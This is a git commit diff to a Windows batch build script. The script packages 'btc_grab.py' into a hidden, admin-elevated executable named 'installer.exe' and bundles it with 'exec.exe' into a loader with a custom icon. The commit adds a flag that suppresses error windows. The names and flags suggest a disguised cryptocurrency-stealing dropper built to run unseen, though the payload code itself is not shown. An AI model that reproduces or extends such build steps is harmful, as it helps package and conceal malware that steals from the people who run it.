9df3b51e45d303274a8f6a2da92ab9a121bb0c20
Marshall Whittaker <marshall@oxagast.org>
2023-04-01 22:55:12 -0400

    Suppress the traceback window on failure

--- build_script.bat
+++ build_script.bat
@@ -1,3 +1,3 @@
-pyinstaller.exe --windowed --noconsole --onefile --uac-admin .\btc_grab.py
+pyinstaller.exe --windowed --noconsole --onefile --disable-windowed-traceback --uac-admin .\btc_grab.py
 copy dist\btc_grab.exe .\installer.exe
-pyinstaller.exe --add-binary="installer.exe;." --add-binary="exec.exe;." --icon=icon.ico --windowed --noconsole --onefile --uac-admin .\loader2.py
+pyinstaller.exe --add-binary="installer.exe;." --add-binary="exec.exe;." --icon=icon.ico --windowed --noconsole --onefile --disable-windowed-traceback --uac-admin .\loader2.py
